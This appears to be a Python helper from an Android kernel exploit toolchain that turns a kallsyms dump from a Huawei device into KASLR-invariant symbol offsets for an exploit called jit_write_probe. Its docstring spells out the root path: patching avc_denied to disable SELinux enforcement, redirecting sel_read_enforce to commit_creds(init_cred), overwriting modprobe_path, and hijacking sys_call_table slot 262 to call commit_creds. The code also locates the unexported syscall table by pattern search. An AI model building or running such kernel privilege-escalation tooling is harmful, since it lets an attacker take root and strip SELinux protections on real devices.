#!/usr/bin/env python3
"""Turn a *symbol dump* (kimage.kallsyms, produced by tools/kallsyms_raw.py
from the on-device physical image dump) into KASLR-invariant symbol offsets
relative to _text, for jit_write_probe's phase F.

Usage:
  python tools/kallsyms_raw.py kimage.bin kimage.kallsyms   # once per build
  python tools/mk_koffs.py kimage.kallsyms koffs.txt       # then this

The raw kallsyms dump lists runtime VAs, so offsets are just VA - _text.
Offsets are constant for a given kernel build, hence the file can be pushed
to /data/local/tmp/koffs.txt and reused across reboots (KASLR only shifts
the base, never the deltas).

Note: this Huawei build strips `selinux_enforcing` from kallsyms (and makes
sel_read_enforce/get_selinux_enforcing lie), so the root path is a code
patch instead of a data write:
  - avc_denied          -> "mov w0,#0; ret; nop"                 (permissive)
  - sel_read_enforce.cfi-> adrp/add commit_creds(init_cred)      (root)
  - modprobe_path       -> /data/local/tmp/mp                    (fallback)
All three are reached from the AArch64 Image header's text_offset, so the
probe only needs img_base (phase E) plus these deltas.

`sys_call_table` is not in kallsyms at all, but it can be found from the
image itself: entry 63/64 are sys_read/sys_write, so the exact pointer pair
locates the table.  Phase G uses it as a pure data path to root:
  - sys_call_table[262] -> commit_creds; syscall(262, init_cred)
Slot 262 holds sys_ni_syscall on this build (as does 244), which the probe
re-checks at run time before patching.
"""
import re
import struct
import sys
import os


def find_sys_call_table(img_path, syms):
    """Locate sys_call_table: entries 63/64 are sys_read/sys_write and the
    table is 292 entries long (mov w25,#0x124 in el0_svc_naked)."""
    need = ["sys_read", "sys_write", "sys_openat", "sys_close"]
    if not all(n in syms for n in need):
        return None
    try:
        with open(img_path, "rb") as f:
            img = f.read()
    except OSError:
        return None
    text = syms["_text"]
    pat = struct.pack("<QQ", syms["sys_read"], syms["sys_write"])
    pos = img.find(pat)
    while pos != -1:
        start = pos - 63 * 8
        if start >= 0 and start + 292 * 8 <= len(img):
            def ent(k):
                return struct.unpack_from("<Q", img, start + 8 * k)[0]
            good = 0
            if ent(56) == syms["sys_openat"] and ent(57) == syms["sys_close"]:
                for k in range(292):
                    v = ent(k)
                    if text <= v < text + 0x4000000:
                        good += 1
                if good >= 290:
                    return start
        pos = img.find(pat, pos + 1)
    return None

# name in koffs.txt -> symbol name in the kallsyms dump
WANT = [
    ("commit_creds", "commit_creds"),
    ("init_cred", "init_cred"),
    ("sel_read_enforce_cfi", "sel_read_enforce.cfi"),
    ("sel_read_enforce", "sel_read_enforce"),
    ("avc_denied", "avc_denied"),
    ("modprobe_path", "modprobe_path"),
    # phase G (data-only root through sys_call_table)
    ("prepare_kernel_cred", "prepare_kernel_cred"),
    ("sys_ni_syscall", "sys_ni_syscall"),
    # kept for diagnostics / alternative text patches
    ("commit_creds_cfi", "commit_creds.cfi"),
    ("selinux_state", "selinux_state"),
    ("selinux_enforcing", "selinux_enforcing"),
    # phase H: drive cache maintenance through sys_call_table[262]
    ("flush_icache_range", "flush_icache_range"),
    ("inval_dcache_area", "__inval_dcache_area"),
    # phase I (v16): walk init_task.tasks to find our own credential, and the
    # linear-map calibration (arm64 KASLR randomizes memstart_addr, so the
    # linear map is NOT at PAGE_OFFSET -- PA = VA - (PAGE_OFFSET - memstart))
    ("init_task", "init_task"),
    ("memstart_addr", "memstart_addr"),
]


def main():
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    src = sys.argv[1]
    out = sys.argv[2] if len(sys.argv) > 2 else "koffs.txt"

    syms = {}
    with open(src, "r", errors="replace") as f:
        for line in f:
            p = line.split()
            if len(p) < 3:
                continue
            if not re.match(r"^[0-9a-fA-F]{8,16}$", p[0]):
                continue
            try:
                syms[p[2]] = int(p[0], 16)
            except ValueError:
                pass

    if "_text" not in syms:
        sys.exit("dump has no _text symbol")
    text = syms["_text"]

    lines = ["_text 0"]
    for name, sym in WANT:
        if sym in syms and syms[sym] >= text:
            lines.append("%s %x" % (name, syms[sym] - text))
        else:
            print("missing symbol: " + sym, file=sys.stderr)

    tab = syms.get("sys_call_table")
    if tab is None:
        img_path = os.path.join(os.path.dirname(os.path.abspath(src)),
                                "kimage.bin")
        if not os.path.exists(img_path):
            img_path = "kimage.bin"
        tab = find_sys_call_table(img_path, syms)
    if tab is not None and tab >= text:
        lines.append("sys_call_table %x" % (tab - text))
    else:
        print("missing symbol: sys_call_table", file=sys.stderr)

    with open(out, "w") as f:
        f.write("\n".join(lines) + "\n")
    sys.stdout.write("\n".join(lines) + "\n")


if __name__ == "__main__":
    main()
